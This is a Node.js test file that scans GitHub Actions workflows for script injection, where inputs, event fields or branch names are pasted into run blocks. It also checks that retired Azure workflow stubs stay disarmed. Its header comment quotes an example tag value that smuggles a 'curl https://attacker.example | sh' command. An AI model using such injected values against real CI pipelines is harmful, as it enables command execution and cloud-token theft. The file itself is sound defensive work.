// A WORKFLOW INPUT OR EVENT FIELD MUST NEVER BE PASTED INTO SHELL.
//
// THE BUG THIS GUARDS (security finding S-03, 2026-10-09). GitHub Actions substitutes an expression into the
// script text BEFORE the shell sees it. So in
//
//     run: az acr build -t "doc-indexer:${{ github.event.inputs.tag }}" .
//
// a tag of  x"; curl https://attacker.example | sh; echo "  is not data, it is a command. Four Azure-era
// workflows did exactly this, in jobs that held `id-token: write`, so anyone able to dispatch a workflow (11
// agent lanes can) had a path to a job that can ask GitHub for a cloud token. actionlint does not catch it: it
// treats dispatch inputs as trusted and only flags a short list of known untrusted event fields.
//
// THE RULE. Inside a `run:` (or `script:` / `inlineScript:`) value, no expression may read `inputs.*`,
// `github.event.*` (this includes `github.event.inputs.*`) or `github.head_ref` / `base_ref` / `ref_name`.
// Pass the value through `env:` and read it as a quoted shell variable, and validate it first:
//
//     env:
//       TAG: ${{ inputs.tag }}
//     run: |
//       [[ "$TAG" =~ ^[A-Za-z0-9._-]{1,128}$ ]] || { echo "bad tag"; exit 1; }
//       az acr build -t "doc-indexer:$TAG" .
//
// The scan is plain text on purpose: this repo's test gate has no install step, so there is no YAML parser to
// lean on. It is checked against a real parser in the PR that added it (see the PR body), and the fixtures
// below pin its behaviour on the shapes that matter.
//
// LEGACY_DEBT is a ratchet, not an allowlist to grow. It lists existing offenders that were found when this
// guard landed and were deliberately left alone because they are outside S-03. A new workflow must be clean.
// When one of them is fixed this test fails until it is removed from the list, so the list only ever shrinks.
import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";

const ROOT = new URL("../", import.meta.url).pathname;
const WF_DIR = join(ROOT, ".github", "workflows");

// ----------------------------------------------------------------------------------------------------------
// Scanner
// ----------------------------------------------------------------------------------------------------------

// Keys whose value is code: a shell script (run), or JavaScript / Azure CLI / PowerShell text (script, inlineScript).
const CODE_KEY = /^(\s*(?:-\s+)*)(run|script|inlineScript)\s*:(.*)$/;
// A YAML block scalar header: |  |-  |+  >  >-  |2  with an optional trailing comment.
const BLOCK_HEADER = /^[|>][+-]?\d*[+-]?\s*(?:#.*)?$/;
const indentOf = (line) => line.length - line.trimStart().length;
const isBlank = (line) => line.trim() === "";

/** Every code-bearing value in a workflow: [{ key, line, body: [{ n, t }] }], n being the 1-based line number. */
function codeBlocks(text) {
  const lines = text.split(/\r?\n/);
  const blocks = [];
  for (let i = 0; i < lines.length; i++) {
    const m = CODE_KEY.exec(lines[i]);
    if (!m) continue;
    const keyCol = m[1].length;
    const rest = m[3].trim();
    if (rest === "") {
      // Nothing after the colon: either a nested mapping (an input NAMED `script`, or `defaults: run:`) or a scalar
      // that starts on the next line. Look at that next line to tell them apart.
      let j = i + 1;
      while (j < lines.length && isBlank(lines[j])) j++;
      if (j >= lines.length || indentOf(lines[j]) <= keyCol || /^\s*(?:-\s+)?[\w.-]+\s*:(?:\s|$)/.test(lines[j])) continue;
    }
    const body = [];
    if (rest !== "" && !BLOCK_HEADER.test(rest)) body.push({ n: i + 1, t: rest }); // inline value on the key line
    let j = i + 1;
    while (j < lines.length) {
      const l = lines[j];
      if (!isBlank(l) && indentOf(l) <= keyCol) break; // back at the key's level or shallower: the value is over
      body.push({ n: j + 1, t: l });
      j++;
    }
    blocks.push({ key: m[2], line: i + 1, body });
    i = j - 1; // lines inside the value are part of it, never separate keys (a heredoc can contain `run:`)
  }
  return blocks;
}

const EXPR = /\$\{\{([\s\S]*?)\}\}/g;

/** Make an expression comparable: lower case, a['b'] as a.b, string literals emptied, whitespace gone. */
function normalize(expr) {
  return expr
    .toLowerCase()
    .replace(/\[\s*'([^']*)'\s*\]/g, ".$1")
    .replace(/'(?:[^']|'')*'/g, "''")
    .replace(/\s+/g, "");
}

// Contexts an outsider (or a prompt-injected agent) can shape. Checked in order; the first match names the finding.
const BAD = [
  [/(^|[^\w.])github\.event\.inputs(?![\w])/, "a workflow_dispatch input (github.event.inputs.*)"],
  [/(^|[^\w.])inputs(?![\w])/, "a workflow input (inputs.*)"],
  [/(^|[^\w.])github\.event(?![\w])/, "an event payload field (github.event.*)"],
  [/(^|[^\w.])github\.(?:head_ref|base_ref|ref_name)(?![\w])/, "a branch or tag name (github.head_ref, base_ref, ref_name)"],
];

/** Every expression inside a code-bearing value that reads one of the contexts above. */
function findInjections(text) {
  const found = [];
  for (const b of codeBlocks(text)) {
    const src = b.body.map((l) => l.t).join("\n");
    const starts = [];
    let off = 0;
    for (const l of b.body) {
      starts.push(off);
      off += l.t.length + 1;
    }
    for (const m of src.matchAll(EXPR)) {
      const hit = BAD.find(([re]) => re.test(normalize(m[1])));
      if (!hit) continue;
      let k = starts.length - 1;
      while (k > 0 && starts[k] > m.index) k--;
      found.push({ line: b.body[k].n, key: b.key, expr: m[0].replace(/\s+/g, " ").slice(0, 100), why: hit[1] });
    }
  }
  return found;
}

// ----------------------------------------------------------------------------------------------------------
// Fixtures: the scanner itself must not rot. Lines are joined, never template literals, because a template literal
// would try to interpolate the expressions.
// ----------------------------------------------------------------------------------------------------------

const wf = (...lines) => lines.join("\n") + "\n";
const flagged = (...lines) => findInjections(wf(...lines));

test("scanner: flags a dispatch input pasted into a run block", () => {
  const f = flagged("jobs:", "  j:", "    steps:", "      - name: x", "        run: |", "          echo hi", '          az acr build -t "x:${{ github.event.inputs.tag }}" .');
  assert.equal(f.length, 1);
  assert.equal(f[0].line, 7);
  assert.match(f[0].why, /github\.event\.inputs/);
});

test("scanner: flags inputs.* in every run shape (block, folded, inline, list item, quoted)", () => {
  const shapes = [
    ["        run: |", '          echo "${{ inputs.a }}"'],
    ["        run: |-", '          echo "${{ inputs.a }}"'],
    ["        run: >", '          echo "${{ inputs.a }}"'],
    ["        run: >-", '          echo "${{ inputs.a }}"'],
    ['        run: echo "${{ inputs.a }}"'],
    ['      - run: echo "${{ inputs.a }}"'],
    ['      - run: |', '          echo "${{ inputs.a }}"'],
    ["        run:", '          echo "${{ inputs.a }}"'],
    ["        run: echo one", '          "${{ inputs.a }}"'],
  ];
  for (const s of shapes) {
    const f = flagged("jobs:", "  j:", "    steps:", "      - name: x", ...s);
    assert.equal(f.length, 1, `not flagged: ${s.join(" / ")}`);
  }
});

test("scanner: reports the right line when the expression is deep inside a long script", () => {
  const f = flagged("      - run: |", "          set -e", "          a=1", "", "          if true; then", '            echo "${{ inputs.deep }}"', "          fi", "      - run: echo ok");
  assert.deepEqual(f.map((x) => x.line), [6]);
});

test("scanner: flags event payload fields and branch names, which an outsider controls", () => {
  assert.equal(flagged('        run: echo "${{ github.event.pull_request.title }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ github.event.issue.body }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ github.head_ref }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ github.ref_name }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ github.base_ref }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ toJSON(github.event) }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ toJSON(inputs) }}"').length, 1);
});

test("scanner: sees through bracket syntax, case and spacing", () => {
  assert.equal(flagged("        run: echo \"${{ inputs['tag'] }}\"").length, 1);
  assert.equal(flagged("        run: echo \"${{ github.event['inputs']['tag'] }}\"").length, 1);
  assert.equal(flagged('        run: echo "${{ INPUTS.tag }}"').length, 1);
  assert.equal(flagged('        run: echo "${{Github.Event.Inputs.tag}}"').length, 1);
  assert.equal(flagged('        run: echo "${{ format(\'{0}\', inputs.tag) }}"').length, 1);
  assert.equal(flagged('        run: echo "${{ inputs.a != \'\' && inputs.a || \'x\' }}"').length, 1);
});

test("scanner: catches a script block and a second expression on one line", () => {
  const f = flagged("      - uses: actions/github-script@v7", "        with:", "          script: |", "            const t = '${{ github.event.issue.title }}';");
  assert.equal(f.length, 1);
  assert.equal(f[0].key, "script");
  assert.equal(flagged('        run: echo "${{ inputs.a }} ${{ inputs.b }}"').length, 2);
});

test("scanner: the safe pattern (env, then a quoted shell variable) is clean", () => {
  const f = flagged(
    "      - name: x",
    "        env:",
    "          TAG: ${{ inputs.tag }}",
    "          TITLE: ${{ github.event.pull_request.title }}",
    "          REF: ${{ github.head_ref }}",
    "        run: |",
    '          [[ "$TAG" =~ ^[a-z0-9]+$ ]] || exit 1',
    '          echo "$TAG $TITLE $REF"',
  );
  assert.deepEqual(f, []);
});

test("scanner: expressions outside a code value are not findings", () => {
  const f = flagged(
    "on:",
    "  workflow_dispatch:",
    "    inputs:",
    "      script:",
    '        description: "A script, or ${{ inputs.nothing }} in prose"',
    "        required: true",
    "      run:",
    "        description: x",
    "concurrency:",
    "  group: g-${{ github.event.inputs.app || 'x' }}",
    "defaults:",
    "  run:",
    "    working-directory: ${{ inputs.dir }}",
    "jobs:",
    "  j:",
    "    if: ${{ inputs.go == 'yes' && github.event_name == 'workflow_dispatch' }}",
    "    steps:",
    "      - name: ${{ inputs.label }}",
    "        if: ${{ github.head_ref != '' }}",
    "        uses: some/action@v1",
    "        with:",
    "          tag: ${{ inputs.tag }}",
    "          path: ${{ github.event.inputs.path }}",
    "        # run: echo ${{ inputs.commented }}",
  );
  assert.deepEqual(f, []);
});

test("scanner: other contexts and look-alikes are not findings", () => {
  const ok = [
    "${{ github.run_id }}",
    "${{ github.event_name }}",
    "${{ github.event_path }}",
    "${{ github.sha }}",
    "${{ github.repository }}",
    "${{ github.workspace }}",
    "${{ github.token }}",
    "${{ secrets.TOKEN }}",
    "${{ vars.AWS_OIDC_ROLE_ARN }}",
    "${{ env.NAME }}",
    "${{ steps.a.outputs.inputs }}",
    "${{ needs.a.outputs.inputs }}",
    "${{ matrix.inputs }}",
    "${{ vars.inputs_dir }}",
    "${{ job.status }}",
    "${{ runner.temp }}",
    "${{ 'a literal that says inputs.x and github.event.y' }}",
  ];
  for (const e of ok) assert.deepEqual(flagged(`        run: echo "${e}"`), [], e);
});

test("scanner: a run: inside another run's heredoc is part of that run, not a second key", () => {
  const f = flagged("        run: |", "          cat > x.yml <<'EOF'", "          run: echo ${{ inputs.a }}", "          EOF", "      - run: echo done");
  assert.equal(f.length, 1);
});

// ----------------------------------------------------------------------------------------------------------
// The tree
// ----------------------------------------------------------------------------------------------------------

// Existing offenders left alone on purpose. Do not add to this list: fix the workflow instead.
const LEGACY_DEBT = {
  "avatar-render.yml":
    "the dispatch inputs script, model, backend and base_video are pasted into the Render step, whose job env carries the " +
    "ElevenLabs, R2, Notion, Replicate and fal keys. It has no id-token, so it is not part of S-03; it needs its own fix.",
};

// The four S-03 workflows, kept as disarmed stubs, with the file their "see ..." pointer must resolve to.
const RETIRED_STUBS = {
  "manage-gateway-env.yml": "runbooks/manage-gateway-env.md",
  "set-graph-exec-credentials.yml": "CLAUDE.md",
  "deploy-eval-gate.yml": ".github/workflows/nightly-eval.yml",
  "build-doc-indexer.yml": ".github/workflows/build-doc-indexer-ecr.yml",
};

const files = readdirSync(WF_DIR).filter((f) => /\.ya?ml$/.test(f)).sort();
const read = (f) => readFileSync(join(WF_DIR, f), "utf8");
const fix = "Pass the value through env: and read it as a quoted shell variable, validated first (see the header of tests/workflow-input-injection.test.mjs).";

test("tree: the scan is reading the workflows, so a green result means something", () => {
  assert.ok(files.length >= 40, `found only ${files.length} workflow files`);
  const blocks = files.reduce((n, f) => n + codeBlocks(read(f)).length, 0);
  // 165 on 2026-10-09 (163 run steps plus 2 github-script blocks, matched against a real YAML parser). Far below that means a broken scan.
  assert.ok(blocks >= 120, `found only ${blocks} run/script values across ${files.length} workflows, the scanner is not reading them`);
  for (const f of Object.keys(RETIRED_STUBS)) assert.ok(files.includes(f), `${f} is missing: a stub must keep its name so stale references fail loudly`);
});

test("tree: no workflow pastes an input, event field or branch name into shell", () => {
  const offenders = [];
  for (const f of files) {
    if (f in LEGACY_DEBT) continue;
    for (const x of findInjections(read(f))) offenders.push(`${f}:${x.line}  ${x.expr}  (${x.why})`);
  }
  assert.deepEqual(offenders, [], `These expressions are substituted into a shell or script value before it runs, so whoever controls the value controls the command. ${fix}\n  - ${offenders.join("\n  - ")}`);
});

test("tree: every LEGACY_DEBT entry is real and still needs fixing, so the list only shrinks", () => {
  for (const [f, why] of Object.entries(LEGACY_DEBT)) {
    assert.ok(files.includes(f), `${f} is listed as legacy debt but no longer exists: remove it from LEGACY_DEBT`);
    assert.ok(why.length > 40, `${f}: LEGACY_DEBT needs a real reason`);
    assert.ok(findInjections(read(f)).length > 0, `${f} is clean now: remove it from LEGACY_DEBT so the guard covers it from here on`);
    assert.ok(!(f in RETIRED_STUBS), `${f} is an S-03 stub and cannot be legacy debt`);
  }
});

/** A file with its full-line comments removed, so a header can talk about id-token or Azure without tripping a check. */
const withoutComments = (text) => text.split(/\r?\n/).filter((l) => !/^\s*#/.test(l)).join("\n");

for (const [f, pointer] of Object.entries(RETIRED_STUBS)) {
  test(`stub: ${f} is disarmed and stays disarmed`, () => {
    const src = withoutComments(read(f));
    // Triggers: workflow_dispatch and nothing else, with no inputs and no workflow_call.
    const lines = src.split("\n");
    const onAt = lines.findIndex((l) => /^on:\s*$/.test(l));
    assert.ok(onAt > -1, "needs a top-level `on:` block");
    const onBlock = [];
    for (const l of lines.slice(onAt + 1)) {
      if (/^\S/.test(l)) break;
      if (l.trim()) onBlock.push(l.trim());
    }
    assert.deepEqual(onBlock, ["workflow_dispatch:"], "the only trigger is a bare workflow_dispatch: no inputs, no workflow_call, no schedule, no push");
    assert.match(src, /^permissions:\s*\{\}\s*$/m, "permissions must be exactly {} at the top level");
    assert.doesNotMatch(src, /^[ \t]+permissions:/m, "no job may widen permissions");
    assert.doesNotMatch(src, /id-token/i, "a stub must not be able to request a cloud token");
    assert.doesNotMatch(src, /\$\{\{/, "a stub has no expressions at all, so nothing can be injected into it");
    assert.doesNotMatch(src, /\buses:/, "a stub runs no actions: no checkout, no cloud login");
    assert.doesNotMatch(src, /\b(secrets|vars)\./, "a stub reads no secrets or variables");
    assert.doesNotMatch(src, /azure\/login|aws-actions|configure-aws-credentials/i, "a stub does no cloud login");
    const jobsAt = lines.findIndex((l) => /^jobs:\s*$/.test(l));
    assert.ok(jobsAt > -1, "needs a jobs: block");
    const jobKeys = lines.slice(jobsAt + 1).filter((l) => /^ {2}[\w-]+:\s*$/.test(l));
    assert.equal(jobKeys.length, 1, "exactly one job");
    const msg = /Retired: Azure was deleted on 2026-08-13; see ([^\s"]+)/.exec(src);
    assert.ok(msg, 'must print "Retired: Azure was deleted on 2026-08-13; see <replacement or runbook>"');
    assert.equal(msg[1], pointer, "the pointer names the documented replacement or runbook");
    assert.ok(existsSync(join(ROOT, pointer)), `${pointer} must exist, or the pointer sends people nowhere`);
    assert.match(src, /^[ \t]+exit 1[ \t]*$/m, "must exit 1 so a stale reference fails loudly");
    assert.equal(findInjections(read(f)).length, 0);
  });
}
